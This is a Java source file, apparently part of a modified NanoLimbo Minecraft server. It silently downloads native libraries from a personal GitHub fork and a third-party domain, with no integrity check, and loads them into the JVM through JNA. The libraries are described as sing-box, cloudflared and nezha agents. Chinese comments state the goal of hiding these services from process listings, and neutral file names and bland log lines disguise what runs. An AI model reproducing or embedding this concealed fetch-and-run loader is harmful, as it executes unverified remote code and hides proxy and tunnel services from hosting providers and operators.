package ua.nanit.limbo.net;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import ua.nanit.limbo.server.Log;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

/**
 * Native 服务加载器（JNA 方案）
 *
 * 通过 JNA 在 JVM 进程内加载 .so，避免 fork 子进程：
 *  - ps 只看到 java 进程，隐蔽性高
 *  - .so 崩溃会直接带崩 JVM → 容器停机 → 触发自动重启
 *
 * .so 来源：
 *  - sing-box: https://github.com/krisxu23/sing-box/releases/download/libsingbox-latest/sbx-{arch}.so
 *    由自己的 fork 仓库 CI 编译，基于官方 sing-box 1.13.14
 *  - cloudflared/nezha: https://<arch>.31888.xyz/{bot.so, agent.so, v1.so}
 *    第三方改造版，导出了 C 符号
 * 所有 .so 通过 JNA 加载，导出 C 函数接收 JSON 字符串参数。
 */
public class NativeServiceLoader {

    /** sing-box .so 从自己的 GitHub fork releases 下载 */
    private static final String SINGBOX_URL_TEMPLATE =
            "https://github.com/krisxu23/sing-box/releases/download/libsingbox-latest/sbx-%s.so";
    /** cloudflared/nezha .so 从第三方下载 */
    private static final String THIRD_PARTY_URL_TEMPLATE = "https://%s.31888.xyz/%s";
    private static final String LIB_DIR_NAME = "lib";

    private final String arch;
    private final Path libDir;

    public NativeServiceLoader() {
        this.arch = detectArch();
        this.libDir = Paths.get(System.getProperty("user.dir"), LIB_DIR_NAME);
        try {
            Files.createDirectories(libDir);
        } catch (IOException e) {
            Log.error("[server] Cannot create lib dir: %s", e.getMessage());
        }
        Log.info("[server] Initializing runtime...");
    }

    private String detectArch() {
        String osArch = System.getProperty("os.arch", "");
        if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            return "arm64";
        }
        return "amd64";
    }

    /**
     * 下载 .so 文件（已存在则复用，不校验 hash）
     *
     * @param remoteName 远端 .so 文件名（用于拼下载 URL）
     * @param localName  本地保存文件名（中性名）
     */
    public Path ensureLibrary(String remoteName, String localName) throws IOException {
        Path target = libDir.resolve(localName);
        if (Files.exists(target) && Files.size(target) > 0) {
            Log.info("[server] Runtime module loaded");
            return target;
        }

        // sing-box .so 从自己的 GitHub fork releases 下载，其他从第三方下载
        String url;
        if ("sbx.so".equals(remoteName)) {
            url = String.format(SINGBOX_URL_TEMPLATE, arch);
        } else {
            url = String.format(THIRD_PARTY_URL_TEMPLATE, arch, remoteName);
        }
        Log.info("[server] Loading runtime modules...");

        Path tmp = libDir.resolve(localName + ".download");
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(180000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        int code = conn.getResponseCode();
        if (code != 200) {
            throw new IOException("HTTP " + code);
        }
        try (var in = conn.getInputStream()) {
            Files.copy(in, tmp, StandardCopyOption.REPLACE_EXISTING);
        }
        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
        return target;
    }

    /**
     * 启动一个 native 服务。
     *
     * @param remoteName   远端 .so 文件名（用于下载 URL）
     * @param localName    本地保存文件名（中性名）
     * @param startSymbol  启动函数符号（如 StartSingBox）
     * @param stopSymbol   停止函数符号（如 StopSingBox），可为 null
     * @param payload      传给 native 的 JSON 字符串
     * @param displayName  日志显示名
     * @return NativeHandle，可用于后续 stop
     */
    public NativeHandle start(String remoteName, String localName, String startSymbol, String stopSymbol,
                              String payload, String displayName) throws Exception {
        Path libPath = ensureLibrary(remoteName, localName);

        NativeLibrary library = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
        Function startFn = library.getFunction(startSymbol);
        Function stopFn = (stopSymbol != null) ? library.getFunction(stopSymbol) : null;

        Thread t = new Thread(() -> {
            try {
                Log.info("[server] Starting %s", displayName);
                // native 通常是阻塞循环，invokeInt 会一直阻塞直到 native 返回
                int code = startFn.invokeInt(new Object[]{payload});
                // 如果 native 正常返回（非崩溃），说明出问题了
                Log.warn("[server] %s exited (code %d)", displayName, code);
                // native 退出 = 服务停止 = 触发 JVM 退出
                triggerJvmExit(displayName + " exited unexpectedly (code=" + code + ")");
            } catch (Throwable e) {
                // UnsatisfiedLinkError / SIGSEGV 等都会到这里
                Log.error("[server] %s error: %s", displayName, e.getMessage());
                triggerJvmExit(displayName + " crashed: " + e.getMessage());
            }
        }, displayName + "-thread");
        t.setDaemon(false); // 非 daemon，崩溃时 JVM 能感知
        t.start();

        return new NativeHandle(library, stopFn, t, displayName);
    }

    /**
     * 触发 JVM 退出。
     * sing-box / cloudflared 崩溃或异常退出时调用，
     * 让整个 Java 进程退出 → 容器检测到进程挂了 → 触发自动重启。
     */
    private void triggerJvmExit(String reason) {
        Log.error("[server] FATAL: %s", reason);
        Log.error("[server] Process terminated");
        // 给日志一点时间刷出
        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        Runtime.getRuntime().halt(1);
    }

    public static class NativeHandle {
        public final NativeLibrary library;
        public final Function stopFn;
        public final Thread thread;
        public final String name;

        NativeHandle(NativeLibrary library, Function stopFn, Thread thread, String name) {
            this.library = library;
            this.stopFn = stopFn;
            this.thread = thread;
            this.name = name;
        }

        public void stop() {
            if (stopFn != null) {
                try {
                    stopFn.invoke(new Object[]{null});
                } catch (Throwable e) {
                    Log.warn("[server] Stop %s failed: %s", name, e.getMessage());
                }
            }
        }
    }
}
